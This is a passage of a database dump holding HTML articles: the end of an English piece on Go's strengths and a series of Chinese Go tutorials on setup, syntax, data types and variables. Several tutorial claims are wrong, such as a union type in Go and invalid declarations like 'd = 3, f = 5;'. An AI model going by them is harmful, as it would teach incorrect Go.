Google are in the process of building a&nbsp;cross-platform GUI library.</p>\r\n\r\n<p>Lacking right now is a sense of any of these being a clear winner or a safe long-term bet. Also, because Go is platform-independent by design, it&#39;s unlikely any of these will become a part of the standard package set.</p>\r\n\r\n<p><strong>The less good: System-level programming</strong></p>\r\n\r\n<p>While Go can talk to native system functions, it&#39;s not as good a fit for creating extremely low-level system components, like embedded systems design, kernels, or device drivers. Some of this is a by-product of the language&#39;s intentions, since the runtime and the garbage collector for Go applications are dependent on the underlying OS. (Those interested in a cutting-edge language for that kind of work should look into&nbsp;Mozilla&#39;s Rust.)</p>\r\n\r\n<p>One project currently in the works that partially leverages Go for systems programming is&nbsp;Ethos, an OS intended to serve as a platform for highly secure software. The kernel is written in C, but the userspace applications will be written in Go -- a smart way to render unto C what is C&#39;s, and render unto Go what Go&#39;s best at right now.</p>\r\n\r\n<p>This story, &quot;What&#39;s the Go language really good for?&quot; was originally published byInfoWorld.</p>\r\n',0,0,'Go语言真正优秀的地方',62,NULL,0),(30,0,'20150617090334',1,'<p>Go语言入门</p>\r\n\r\n<p>1. 简介<br />\r\n本文是关于Go编程语言的基础教程，主要面向有C/C++基础的读者。它并不是一个语言的完整指南，关于 Go的具体细节请参考 语言规范 一文。在读完这个入门教程后， 深入的华可以继续看 Effective Go ，这个文档 将涉及到Go语言的更多特性。此外，还有一个《Go语言三日教程》系列讲座。</p>\r\n\r\n<p>下面将通过一些小程序来演示go语言的一些关键特性。所有的演示程序都是可以运行的，程序的代码在安装目录的&nbsp;/doc/progs/&nbsp;子目录中。</p>\r\n\r\n<p>文中的代码都会标出在源代码文件中对应的行号。同时为了清晰起见，我们忽略了源代码文件空白行的行号。</p>\r\n\r\n<p>2. Hello，世界</p>\r\n\r\n<p><br />\r\n<br />\r\n<br />\r\n<br />\r\n让我们从经典的&quot;Hello, World&quot;程序开始：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\nimport fmt \"fmt\"  // Package implementing formatted I/O.\r\nfunc main() {\r\n    fmt.Printf(\"Hello, world; or Καλημέρα κόσμε; or こんにちは 世界\\n\")\r\n}</code></pre>\r\n\r\n<p>每个Go源文件开头都有一个package声明语句，指明源文件所在的包。同时，我们也可以根据具体的需要 来选择导入(import语句)特定功能的包。在这个例子中，我们通过导入fmt包来使用我们熟悉的printf函数。 不过在Go语言中，Printf函数的是大写字母开头，并且以fmt包名作为前缀：fmt.Printf。</p>\r\n\r\n<p>关键字func用于定义函数。在所有初始化完成后，程序从main包中的main函数开始执行。</p>\r\n\r\n<p>常量字符串可以包含Unicode字符，采用UTF-8编码。实际上，所有的Go语言源文件都采用UTF-8编码。</p>\r\n\r\n<p>代码注释的方式和C++类似：</p>\r\n\r\n<pre>\r\n          /* ... */\r\n          // ...\r\n</pre>\r\n\r\n<p>稍后，我们还有很多的关于打印的话题。</p>\r\n\r\n<p>3. 分号(Semicolons)</p>\r\n\r\n<p><br />\r\n比较细心的读者可能发现前面的代码中基本没有出现分号;。其实在go语言中，只有在分隔 for循环的初始化语句时才经常用到；但是代码段末尾的分号一般都是省略的。</p>\r\n\r\n<p>当然，你也可以像C或JAVA中那样使用分号。不过在大多数情况下，一个完整语句末尾的分号 都是有go编译器自动添加的&mdash;&mdash;用户不需要输入每个分号。</p>\r\n\r\n<p>关于分号的详细描述，可以查看Go语言说明文档。不过在实际写代码时，只需要记得一行末尾的分号 可以省略就可以了(对于一行写多个语句的，可以用分号隔开)。还有一个额外的好处是：在退出 大括号包围的子区域时，分号也是可以省略的。</p>\r\n\r\n<p>在一些特殊情况下，甚至可以写出没有任何分号的代码。不过有一个重要的地方：对于&quot;if&quot;等 后面有大括弧的语句，需要将左大括弧放在&quot;if&quot;语句的同一行，如果不这样的话可能出现编译错误。 Go语言强制使用将开始大括弧放在同一行末尾的编码风格。</p>\r\n\r\n<p>4. 编译</p>\r\n\r\n<p><br />\r\nGo是一个编译型的语言。目前有两种编译器，其中&quot;Gccgo&quot;采用GCC作为编译后端。另外还有 根据处理器架构命名的编译器：针对64位x86结构为&quot;6g&quot;，针对32位x86结构的为&quot;8g&quot;等等。 这些go专用的编译器编译很快，但是产生的目标代码效率比gccgo稍差一点。目前(2009年底)， go专用的编译器的运行时系统比&quot;gccgo&quot;要相对健壮一点。</p>\r\n\r\n<p>下面看看如何编译并运行程序。先是用针对64位x86结构处理器的&ldquo;6g&rdquo;：</p>\r\n\r\n<pre>\r\n  $ 6g helloworld.go  # 编译; 输出 helloworld.6\r\n  $ 6l helloworld.6   # 链接; 输出 6.out\r\n  $ 6.out\r\n  Hello, world; or &Kappa;&alpha;&lambda;&eta;&mu;έ&rho;&alpha; &kappa;ό&sigma;&mu;&epsilon;; or こんにちは 世界\r\n  $\r\n</pre>\r\n\r\n<p>如果是用gccgo编译，方法和传统的gcc编译方法类似：</p>\r\n\r\n<pre>\r\n  $ gccgo helloworld.go\r\n  $ a.out\r\n  Hello, world; or &Kappa;&alpha;&lambda;&eta;&mu;έ&rho;&alpha; &kappa;ό&sigma;&mu;&epsilon;; or こんにちは 世界\r\n  $</pre>\r\n',0,0,'go语言系列教程（1）-简介',92,'/upload/article/30/5376646f-4869-4f96-b522-269e6820bacd.jpg',100),(31,0,'20150617090525',1,'<p>在这里我们介绍设置Go编程语言环境，需要在你的计算机上的准备以下两个软件，(A)文本编辑器和(B)Go编译器。</p>\r\n\r\n<p>文本编辑器</p>\r\n\r\n<p>这将用来键入程序。一些编辑器的例子包括Windows记事本，OS编辑命令，简，Brief, Epsilon, EMACS和VIM或vi。</p>\r\n\r\n<p>文本编辑器名称和版本在不同的操作系统可能不太一样。例如，记事本将用于Windows；VIM或vi可以在Windows以及Linux或UNIX上使用。</p>\r\n\r\n<p>编辑器创建的文件称为源文件和包含程序源代码。对于围棋程序的源文件通常命名扩展为 &quot;.go&quot;.</p>\r\n\r\n<p>在开始编程之前，请确保您有到位一个文本编辑器，并有足够的经验来写计算机程序，将其保存在一个文件，编译并最终执行。</p>\r\n\r\n<p>Go编译器</p>\r\n\r\n<p>写在源文件的源代码是程序的人类可读的源代码。它需要被&ldquo;编译&rdquo;，转成机器语言，使CPU可以真正执行程序按给定的指令。</p>\r\n\r\n<p>Go编程语言编译器将用于编译源代码到最终的可执行程序。这里我们假设你有一个关于编程语言编译器的基本知识。</p>\r\n\r\n<p>Go发行版以二进制安装在FreeBSD（8及以上），在Linux，Mac OS X（Snow Leopard及以上）和Windows 32位（386）和64位（AMD64）的x86处理器架构操作系统。</p>\r\n\r\n<p>以下部分将指导您如何安装Go在各种操作系统上的二进制分发版本。</p>\r\n\r\n<p>下载Go存档</p>\r\n\r\n<p>下载最新的版本的Go安装归档文件:&nbsp;Go下载。&nbsp;在写这篇教程的时候，下载的是&nbsp;go1.4.windows-amd64.msi&nbsp;然后拷贝到&nbsp;<strong>C:\\&gt;go&nbsp;</strong>目录</p>\r\n\r\n<table class=\"src\" style=\"background-color:rgb(247, 247, 247); border-collapse:collapse; border-color:rgb(214, 214, 214); border-spacing:0px; box-sizing:border-box; color:rgb(49, 49, 49); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-bottom:8px; margin-top:8px; max-width:100%; vertical-align:top; width:604px\">\r\n	<tbody>\r\n		<tr>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:120px\">OS</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">归档名称</th>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">Windows</td>\r\n			<td style=\"vertical-align:top\">go1.4.windows-amd64.msi</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">Linux</td>\r\n			<td style=\"vertical-align:top\">go1.4.linux-amd64.tar.gz</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">Mac</td>\r\n			<td style=\"vertical-align:top\">go1.4.darwin-amd64-osx10.8.pkg</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">FreeBSD</td>\r\n			<td style=\"vertical-align:top\">go1.4.freebsd-amd64.tar.gz</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>安装在UNIX / Linux/ Mac OS X和FreeBSD</p>\r\n\r\n<p>解压下载归档到/usr/local，即创建一个Go树在 /usr/local/go。例如：</p>\r\n\r\n<p>tar -C /usr/local -xzf go1.4.linux-amd64.tar.gz</p>\r\n\r\n<p>添加/usr/local/go/bin到PATH环境变量。</p>\r\n\r\n<table class=\"src\" style=\"background-color:rgb(247, 247, 247); border-collapse:collapse; border-color:rgb(214, 214, 214); border-spacing:0px; box-sizing:border-box; color:rgb(49, 49, 49); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-bottom:8px; margin-top:8px; max-width:100%; vertical-align:top; width:604px\">\r\n	<tbody>\r\n		<tr>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:120px\">OS</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">输出</th>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">Linux</td>\r\n			<td style=\"vertical-align:top\">export PATH=$PATH:/usr/local/go/bin</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">Mac</td>\r\n			<td style=\"vertical-align:top\">export PATH=$PATH:/usr/local/go/bin</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">FreeBSD</td>\r\n			<td style=\"vertical-align:top\">export PATH=$PATH:/usr/local/go/bin</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>在Windows上安装</p>\r\n\r\n<p>使用MSI文件，然后按照提示安装围棋工具。默认情况下，安装程序使用转到分布在c:\\Go。安装程序应设置c:\\Go\\bin目录到Windows PATH环境变量。重新启动任何打开命令提示符，以使更改生效。</p>\r\n\r\n<p>验证安装</p>\r\n\r\n<p>创建一个名为test.go的go文件<strong>&nbsp;C:\\&gt;Go_WorkSpace</strong></p>\r\n\r\n<p style=\"text-align:justify\"><em>File: test.go</em></p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n\r\nfunc main() {\r\n   fmt.Println(\"Hello, World!\")\r\n}</code></pre>\r\n\r\n<p>现在运行test.go看到结果如下：</p>\r\n\r\n<pre>\r\nC:\\Go_WorkSpace&gt;go run test.go\r\n</pre>\r\n\r\n<p>验证输出</p>\r\n\r\n<pre>\r\nHello, World!\r\n\r\n</pre>\r\n',0,0,'go语言系列教程2-环境配置',113,NULL,0),(32,0,'20150617091034',1,'<p>在我们学习Go编程语言的基本构建模块，让我们看看一个最低限度的Go程序结构，这样我们就可以把它作为即将到来的章节的参考。</p>\r\n\r\n<p>Go Hello World 示例</p>\r\n\r\n<p>Go程序主要由以下几部分组成：</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>包声明</p>\r\n	</li>\r\n	<li>\r\n	<p>导入包</p>\r\n	</li>\r\n	<li>\r\n	<p>函数</p>\r\n	</li>\r\n	<li>\r\n	<p>变量</p>\r\n	</li>\r\n	<li>\r\n	<p>语句和表达式</p>\r\n	</li>\r\n	<li>\r\n	<p>注释</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>让我们来看看，将打印字的简单&nbsp; &quot;Hello World&quot; 的代码:</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n\r\nfunc main() {\r\n   /* This is my first sample program. */\r\n   fmt.Println(\"Hello, World!\")\r\n}</code></pre>\r\n\r\n<p>让我们来看看上面的程序的各个部分：</p>\r\n\r\n<ol>\r\n	<li>\r\n	<p>程序包体的第一行定义了这个程序包的名称。这是一个必须声明为Go程序运行在什么包。main包是起始点来运行程序。每个包都有一个与之关联的路径和名称。</p>\r\n	</li>\r\n	<li>\r\n	<p>下一行import &quot;fmt&quot; 是告诉编译器去包含文件在包fmt的预处理命令。</p>\r\n	</li>\r\n	<li>\r\n	<p>下一行 func main()主要功能是为程序执行的开始。</p>\r\n	</li>\r\n	<li>\r\n	<p>下一行/*...*/会被编译器被忽略，它已被加入到程序添加注释。因此，这样的行称为程序中的注释。注释也使用//类似于Java或C++注释。</p>\r\n	</li>\r\n	<li>\r\n	<p>下一行 fmt.Println（...）是提供另一种功能，使消息&ldquo;Hello, World!&rdquo;要显示在屏幕上。这里fmt包已导出， println方法用来在屏幕上显示消息。</p>\r\n	</li>\r\n	<li>\r\n	<p>注意println方法。在Go语言中，一个名字如果它用大写字母开头为导出。导出是指一个函数或变量/常访问到相应的包导入。</p>\r\n	</li>\r\n</ol>\r\n\r\n<p>执行Go程序：</p>\r\n\r\n<p>让我们看一下如何保存的源代码文件，以及如何编译并运行它。以下是简单的步骤：</p>\r\n\r\n<ol>\r\n	<li>\r\n	<p>打开文本编辑器，并添加上述代码</p>\r\n	</li>\r\n	<li>\r\n	<p>将文件另存为&nbsp;hello.go</p>\r\n	</li>\r\n	<li>\r\n	<p>打开命令提示符并转到目录中保存文件。</p>\r\n	</li>\r\n	<li>\r\n	<p>键入go run hello.go并回车来运行你的代码。</p>\r\n	</li>\r\n	<li>\r\n	<p>如果在你的代码中没有错误，那么就可以看到&ldquo;Hello World&rdquo;字样在屏幕上。</p>\r\n	</li>\r\n</ol>\r\n\r\n<pre>\r\n$ go run hello.go\r\nHello, World!\r\n</pre>\r\n\r\n<p>确保Go编译器是在路径和目录中包含源文件hello.go，并运行它。</p>\r\n',0,0,'go语言系列教程3-程序结构',63,NULL,0),(33,0,'20150617091209',1,'<p>前面已经看到了Go程序的基本结构，所以这将是很容易理解Go编程语言等基本构建块。</p>\r\n\r\n<p>Go令牌</p>\r\n\r\n<p>Go程序包括各种令牌和令牌可以是一个关键字，一个标识符，常量，字符串文字或符号。例如，下面的Go语句由六个令牌：</p>\r\n\r\n<pre>\r\nfmt.Println(&quot;Hello, World!&quot;)\r\n</pre>\r\n\r\n<p>个体令牌是：</p>\r\n\r\n<pre>\r\nfmt\r\n.\r\nPrintln\r\n(\r\n&quot;Hello, World!&quot;\r\n)\r\n</pre>\r\n\r\n<p>行分离器</p>\r\n\r\n<p>在Go程序，行的分隔符关键是一个语句终止。也就是说，每一个单独语句不需要特殊的分隔线; 在C编译器转到内部的地方; 作为语句终止符，表示一个逻辑实体的结束。</p>\r\n\r\n<p>例如，下面是两个不同的陈述：</p>\r\n\r\n<pre>\r\nfmt.Println(&quot;Hello, World!&quot;)\r\nfmt.Println(&quot;I am in Go Programming World!&quot;)\r\n</pre>\r\n\r\n<p>注释</p>\r\n\r\n<p>注释就像帮助文本在你的Go程序，它们是由编译器忽略。他们开始使用字符/*和终止使用*/如下图所示：</p>\r\n\r\n<pre>\r\n/* my first program in Go */\r\n</pre>\r\n\r\n<p>不能在注释中的含有注释，并且它们不能在一个字符串或字符文字出现。</p>\r\n\r\n<p>标识符</p>\r\n\r\n<p>Go标识符是用来标识变量，函数，或任何其它用户定义的项目名称。一个标识符开始以字母A到Z或a到z或下划线_后跟零个或多个字母，下划线和数字（0〜9）。</p>\r\n\r\n<p>identifier = letter { letter | unicode_digit } .</p>\r\n\r\n<p>Go语言不允许标识符中的标点字符，如@，$和%。Go是一种区分大小写的编程语言。所以,&nbsp;Manpower&nbsp;和&nbsp;manpower&nbsp;在Go中是两个不同的标识符。这里是可接受的标识符的一些例子：</p>\r\n\r\n<pre>\r\nmahesh   kumar   abc   move_name   a_123\r\nmyname50   _temp   j   a23b9   retVal\r\n</pre>\r\n\r\n<p>关键词</p>\r\n\r\n<p>下面的列表显示了Go的保留字。这些保留的字可以不被用作常量或变量，或任何其他的标识符名称。</p>\r\n\r\n<table class=\"src\" style=\"background-color:rgb(247, 247, 247); border-collapse:collapse; border-color:rgb(214, 214, 214); border-spacing:0px; box-sizing:border-box; color:rgb(49, 49, 49); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-bottom:8px; margin-top:8px; max-width:100%; vertical-align:top; width:604px\">\r\n	<tbody>\r\n		<tr>\r\n			<td style=\"vertical-align:top; width:136px\">break</td>\r\n			<td style=\"vertical-align:top; width:140px\">default</td>\r\n			<td style=\"vertical-align:top; width:136px\">func</td>\r\n			<td style=\"vertical-align:top; width:138px\">interface</td>\r\n			<td style=\"vertical-align:top; width:53px\">select</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">case</td>\r\n			<td style=\"vertical-align:top\">defer</td>\r\n			<td style=\"vertical-align:top\">go</td>\r\n			<td style=\"vertical-align:top\">map</td>\r\n			<td style=\"vertical-align:top\">struct</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">chan</td>\r\n			<td style=\"vertical-align:top\">else</td>\r\n			<td style=\"vertical-align:top\">goto</td>\r\n			<td style=\"vertical-align:top\">package</td>\r\n			<td style=\"vertical-align:top\">switch</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">const</td>\r\n			<td style=\"vertical-align:top\">fallthrough</td>\r\n			<td style=\"vertical-align:top\">if</td>\r\n			<td style=\"vertical-align:top\">range</td>\r\n			<td style=\"vertical-align:top\">type</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">continue</td>\r\n			<td style=\"vertical-align:top\">for</td>\r\n			<td style=\"vertical-align:top\">import</td>\r\n			<td style=\"vertical-align:top\">return</td>\r\n			<td style=\"vertical-align:top\">var</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>在Go中空白格</p>\r\n\r\n<p>仅包含空格，可能与注释行，被称为一个空行，Go编译器完全忽略它。</p>\r\n\r\n<p>空白是在Go中用来描述空格，制表符，换行符和注释术语。空格分隔从另一个声明的一部分，使编译器能够找出在一份声明中的一个元素，如int，结束且下一个元素开始。因此，在下面的语句：</p>\r\n\r\n<pre>\r\nvar age int;\r\n</pre>\r\n\r\n<p>必须有至少一个空白字符（通常是一个空格）int和age之间的编译器，以便能够区分它们。在另一方面，在下面的语句：</p>\r\n\r\n<pre>\r\nfruit = apples + oranges;   // get the total fruit\r\n</pre>\r\n\r\n<p>无空白字符是必要的，fruit和=之间或=和apples，虽然是自由的，如果想便于阅读的目的，最好包括一些空格。<br />\r\n&nbsp;</p>\r\n',0,0,'go语言系列教程4-基本语法',63,NULL,0),(34,0,'20150617091310',1,'<p>在Go编程语言，数据类型指用于声明变量或不同类型的功能的广泛的系统。变量的类型决定了有多少空间占用的存储和存储方式的位模式将被解释。</p>\r\n\r\n<p>Go的数据类型可分类如下：</p>\r\n\r\n<table class=\"src\" style=\"background-color:rgb(247, 247, 247); border-collapse:collapse; border-color:rgb(214, 214, 214); border-spacing:0px; box-sizing:border-box; color:rgb(49, 49, 49); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-bottom:8px; margin-top:8px; max-width:100%; vertical-align:top; width:604px\">\r\n	<tbody>\r\n		<tr>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">S.N.</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">类型和说明</th>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">1</td>\r\n			<td style=\"vertical-align:top\"><strong>Boolean Types</strong><br />\r\n			它们是布尔类型，它由两个预定义的常量：(a) true (b) false</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">2</td>\r\n			<td style=\"vertical-align:top\"><strong>Numeric Types</strong><br />\r\n			它们是算术类型，表示整数类型或b。在整个程序浮点值</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">3</td>\r\n			<td style=\"vertical-align:top\"><strong>string types:</strong><br />\r\n			一个字符串类型代表组字符串值。它的值是一个字节序列。字符串是一次创造了稳定的类型，这是不可能改变一个字符串的内容。预声明的字符串类型为字符串</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">4</td>\r\n			<td style=\"vertical-align:top\"><strong>Derived types:</strong><br />\r\n			它们包括：(a)指针类型，(b)数组类型，(c)结构类型，(d)联盟类型及(e)函数类型(f)切片类(g)函数类型(h)接口类型(i)地图类型(j)管道类型</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>数组类型和结构类型被统称为聚合类型。函数的类型指定的一组具有相同的参数和结果类型所有函数。我们将看到基本类型在下面的部分，而其他类型将包括在后面的章节。</p>\r\n\r\n<p>整型</p>\r\n\r\n<p>预定义架构无关的整数类型有：</p>\r\n\r\n<table class=\"src\" style=\"background-color:rgb(247, 247, 247); border-collapse:collapse; border-color:rgb(214, 214, 214); border-spacing:0px; box-sizing:border-box; color:rgb(49, 49, 49); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-bottom:8px; margin-top:8px; max-width:100%; vertical-align:top; width:604px\">\r\n	<tbody>\r\n		<tr>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">S.N.</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">类型和说明</th>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">1</td>\r\n			<td style=\"vertical-align:top\"><strong>uint8</strong><br />\r\n			8位无符号整数 (0 - 255)</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">2</td>\r\n			<td style=\"vertical-align:top\"><strong>uint16</strong><br />\r\n			16位无符号整数 (0 - 65535)</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">3</td>\r\n			<td style=\"vertical-align:top\"><strong>uint32</strong><br />\r\n			32位无符号整数 (0 - 4294967295)</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">4</td>\r\n			<td style=\"vertical-align:top\"><strong>uint64</strong><br />\r\n			64位无符号整数 (0 - 18446744073709551615)</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">5</td>\r\n			<td style=\"vertical-align:top\"><strong>int8</strong><br />\r\n			有符号8位整数 (-128 - 127)</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">6</td>\r\n			<td style=\"vertical-align:top\"><strong>int16</strong><br />\r\n			有符号16位整数 (-32768 - 32767)</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">7</td>\r\n			<td style=\"vertical-align:top\"><strong>int32</strong><br />\r\n			有符号的32位整数 (-2147483648 - 2147483647)</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">8</td>\r\n			<td style=\"vertical-align:top\"><strong>int64</strong><br />\r\n			有符号的64位整数 (-9223372036854775808 - 9223372036854775807)</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>浮点类型</p>\r\n\r\n<p>预定义架构无关的浮点类型是：</p>\r\n\r\n<table class=\"src\" style=\"background-color:rgb(247, 247, 247); border-collapse:collapse; border-color:rgb(214, 214, 214); border-spacing:0px; box-sizing:border-box; color:rgb(49, 49, 49); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-bottom:8px; margin-top:8px; max-width:100%; vertical-align:top; width:604px\">\r\n	<tbody>\r\n		<tr>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">S.N.</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">类型和说明</th>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">1</td>\r\n			<td style=\"vertical-align:top\"><strong>float32</strong><br />\r\n			IEEE-754 32-bit 浮点数</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">2</td>\r\n			<td style=\"vertical-align:top\"><strong>float64</strong><br />\r\n			IEEE-754 64-bit 浮点数</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">3</td>\r\n			<td style=\"vertical-align:top\"><strong>complex64</strong><br />\r\n			复数与float32实部和虚部</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">4</td>\r\n			<td style=\"vertical-align:top\"><strong>complex128</strong><br />\r\n			复数与float64实部和虚部</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>n位整数的值是n比特，并使用2的补码算术运算表示。</p>\r\n\r\n<p>其它数值类型</p>\r\n\r\n<p>还有一组数字类型与执行的具体大小：</p>\r\n\r\n<table class=\"src\" style=\"background-color:rgb(247, 247, 247); border-collapse:collapse; border-color:rgb(214, 214, 214); border-spacing:0px; box-sizing:border-box; color:rgb(49, 49, 49); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-bottom:8px; margin-top:8px; max-width:100%; vertical-align:top; width:604px\">\r\n	<tbody>\r\n		<tr>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">S.N.</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">类型和说明</th>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">1</td>\r\n			<td style=\"vertical-align:top\"><strong>byte</strong><br />\r\n			相同于 uint8</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">2</td>\r\n			<td style=\"vertical-align:top\"><strong>rune</strong><br />\r\n			相同于&nbsp;int32</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">3</td>\r\n			<td style=\"vertical-align:top\"><strong>uint</strong><br />\r\n			32 或 64 位</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">4</td>\r\n			<td style=\"vertical-align:top\"><strong>int</strong><br />\r\n			相同于&nbsp;uint 的大小</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">5</td>\r\n			<td style=\"vertical-align:top\"><strong>uintptr</strong><br />\r\n			一个无符号整数来存储指针值的解释的比特位<br />\r\n			&nbsp;</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n',0,0,'go语言系列教程5-数据类型',104,NULL,0),(35,0,'20150617091658',1,'<p>变量是什么，只不是给定到存储区域，我们的程序可以操纵的名称。在Go中每个变量具有特定的类型，它确定的大小和可变的存储器的布局;能确定存储器内存储的值的范围;和组操作可以施加到变量。</p>\r\n\r\n<p>一个变量名可以由字母，数字和下划线。它必须以字母或下划线。大写和小写字母是不同的，因为Go是区分大小写的。基于该基本类型在前面的章节中说明的那样，将有以下基本变量类型：</p>\r\n\r\n<table class=\"src\" style=\"background-color:rgb(247, 247, 247); border-collapse:collapse; border-color:rgb(214, 214, 214); border-spacing:0px; box-sizing:border-box; color:rgb(49, 49, 49); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-bottom:8px; margin-top:8px; max-width:100%; vertical-align:top; width:604px\">\r\n	<tbody>\r\n		<tr>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:120px\">类似</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">描述</th>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">byte</td>\r\n			<td style=\"vertical-align:top\">通常单个字节(一个字节)，这是一个字节的类型</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">int</td>\r\n			<td style=\"vertical-align:top\">整数最自然的尺寸的机器</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">float32</td>\r\n			<td style=\"vertical-align:top\">单精度浮点值</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>Go编程语言也可以定义各种其他类型的变量，我们将在以后的章节列出，如：枚举，指针，数组，结构，联合，等等。对于本章覆盖，让我们只学习研究的基本变量类型。</p>\r\n\r\n<p>在Go中变量定义：</p>\r\n\r\n<p>一个变量的定义是指，告诉编译器在哪里，有多少创建存储变量。变量定义指定一个数据类型，并且包含的该类型，如下的一个或多个变量的列表：</p>\r\n\r\n<pre>\r\nvar variable_list optional_data_type;\r\n</pre>\r\n\r\n<p>在这里，optional_data_type可以包括字节，整型，float32，complex64，布尔或任何用户定义的对象等有效Go的数据类型，variable_list可以由用逗号分隔的一个或多个标识符名称。一些有效的声明如下所示：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">var    i, j, k int;\r\nvar   c, ch byte;\r\nvar  f, salary float32;\r\nd = 42;</code></pre>\r\n\r\n<p>这一行var i, j, k; 既声明并定义了变量i，j和k;这指示编译器创建一个名为i，j和k的 int类型变量。</p>\r\n\r\n<p>变量可以初始化(分配初始值)在他们的声明。变量的类型是由编译器自动根据传递给它的值判断。初始化包括一个等号后跟一个常量表达式如下：</p>\r\n\r\n<pre>\r\nvariable_name = value;\r\n</pre>\r\n\r\n<p>一些实例是：</p>\r\n\r\n<pre>\r\nd = 3, f = 5;    // declaration of d and f. Here d and f are int 